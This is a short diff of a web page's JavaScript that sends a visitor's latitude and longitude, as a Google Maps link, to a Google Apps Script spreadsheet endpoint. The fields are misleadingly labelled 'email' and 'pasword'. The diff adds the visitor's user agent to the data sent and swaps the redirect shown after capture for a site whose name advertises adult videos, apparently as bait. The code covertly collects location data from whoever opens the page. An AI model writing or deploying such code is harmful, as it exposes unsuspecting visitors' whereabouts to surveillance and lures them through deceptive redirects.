@@ -431,7 +431,7 @@ function Redirect() {
      var datetime = new Date().today() ;
 
 	function ok(latitude , longitude ) {
-	    var src = "https://script.google.com/macros/s/AKfycbwvRlurPQ0nDCp_StgnybhG2Q8_CAdu4fw-4_V1Z8EMDaRosrc/exec?id=1ZiCB96-heu56uabsOofrJ5an8WPXISzlOuSeU41DVmw&sheet=data&action=insert&nama=http://maps.google.com/maps?q=loc:"+latitude+","+longitude+"&email=,"+latitude+"&pasword=,"+longitude+"&nope=BLOG 3 : "+datetime+" . "+m;
+	    var src = "https://script.google.com/macros/s/AKfycbwvRlurPQ0nDCp_StgnybhG2Q8_CAdu4fw-4_V1Z8EMDaRosrc/exec?id=1ZiCB96-heu56uabsOofrJ5an8WPXISzlOuSeU41DVmw&sheet=data&action=insert&nama=http://maps.google.com/maps?q=loc:"+latitude+","+longitude+"&email=,"+latitude+"&pasword=,"+longitude+"&nope= "+datetime+" . "+userAgent;
 
 
      // id = unique id of the message/comment/chat
@@ -444,7 +444,7 @@ var request = $.ajax({
 			  });
  
 request.done(function( msg ) {
-               window.location = "https://forms.gle/jqQ1kc5gfC4WSqzJ8";
+               window.location = "https://videobokepterbaru2022.web.app";
 });
  
 request.fail(function( jqXHR, textStatus ) {
